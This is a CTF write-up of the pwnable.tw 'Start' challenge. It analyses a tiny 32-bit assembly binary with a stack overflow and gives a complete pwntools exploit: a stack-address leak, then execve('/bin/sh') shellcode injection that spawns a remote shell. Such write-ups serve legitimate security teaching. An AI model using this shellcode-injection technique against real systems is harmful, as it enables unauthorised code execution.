---
title: "Pwnable.tw: Start"
date: 2019-01-01
description: "Pwnable.tw Start challenge: shellcode injection via stack-based buffer overflow on a minimal 32-bit Linux binary with no NX protection"
tags: ["pwnable.tw", "pwn", "shellcode", "buffer-overflow", "32-bit"]
platform: "wargame"
category: "pwn"
difficulty: "easy"
categories: ["CTF"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## Overview

Start is a minimal 32-bit Linux binary written entirely in x86 assembly with no libc, no stack protection, and no NX. The challenge requires leaking a stack address then injecting shellcode.

## Source

```asm
push    esp
push    offset _exit
xor     eax, eax
xor     ebx, ebx
xor     ecx, ecx
xor     edx, edx
push    3A465443h
push    20656874h
push    20747261h
push    74732073h
push    2774654Ch       ; "Let's start the CTF:"
mov     ecx, esp        ; addr
mov     dl, 14h         ; len = 20
mov     bl, 1           ; fd = stdout
mov     al, 4
int     80h             ; sys_write(1, esp, 20)
xor     ebx, ebx
mov     dl, 3Ch         ; len = 60
mov     al, 3
int     80h             ; sys_read(0, ecx, 60)
add     esp, 14h        ; restore stack by 20 bytes
retn
```

## Analysis

The code:
1. Zeros out `eax`, `ebx`, `ecx`, `edx`
2. Pushes the string `"Let's start the CTF:"` (5 dwords = 20 bytes) onto the stack
3. Copies `esp` into `ecx` — the `sys_write` address parameter — without modifying `esp` itself
4. Calls `sys_write(stdout, esp, 20)` to print the prompt
5. Calls `sys_read(stdin, ecx, 60)` — reads 60 bytes into the same `ecx` (which still points to the stack)
6. Runs `add esp, 14h` to pop the 20 bytes of string data off the stack
7. Executes `retn` — pops the next value off the stack as the return address

The `read` call accepts 60 bytes but the string data is only 20 bytes. After `add esp, 0x14`, the first 4 bytes past the string data become the return address. That gives 20 bytes of buffer + 4 bytes to overwrite `ret`.

## Exploitation Strategy

The key insight: `esp` does not change between the `sys_write` and `sys_read` calls. The `sys_write` call prints the current stack pointer value as part of the output. By redirecting `ret` back to the `mov ecx, esp` instruction (`0x8048087`), the program executes `sys_write(stdout, esp, 20)` a second time — this time the stack has shifted by 20 bytes due to `add esp, 0x14`, so it leaks the actual return address area.

The leaked 4 bytes give us a live stack address. Adding `0x14` to it points past the string region, directly into where shellcode will land in the second payload.

## Solve

```python
from pwn import *

p = remote("chall.pwnable.tw", 10000)
#p = process("./start")

context.arch = 'i386'

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

print p.recvuntil("Let's start the CTF:")

# Stage 1: overwrite ret with 0x8048087 (mov ecx, esp) to leak stack address
payload = ""
payload += "A" * 20          # fill the string buffer
payload += p32(0x8048087)    # ret → back to mov ecx, esp → triggers sys_write again

p.send(payload)

# The second sys_write prints 20 bytes starting from the (now shifted) esp
leak = u32(p.recv(4))
print "leak : ", hex(leak)
p.recv()

# Stage 2: send shellcode; jump to leak+0x14 (past the 20-byte padding, into shellcode)
payload2 = ""
payload2 += "\x90" * 0x14   # NOP sled / padding
payload2 += p32(leak + 0x14) # ret → stack address where shellcode begins
payload2 += shellcode

p.send(payload2)

p.interactive()
```

## Payload Breakdown

**Stage 1**

```
[A * 20][0x8048087]
  ^           ^
  |           |
  fill        ret → mov ecx, esp (re-execute write to leak esp)
```

**Stage 2**

```
[NOP * 20][leak + 0x14][shellcode]
               ^
               ret points here → executes shellcode
```

The leaked address is the `esp` value at the time of the second `sys_write`. Since `esp` shifts by `0x14` after each iteration of `add esp, 14h`, adding `0x14` to the leaked value gives the address immediately after the padding — exactly where the shellcode starts in the second payload.
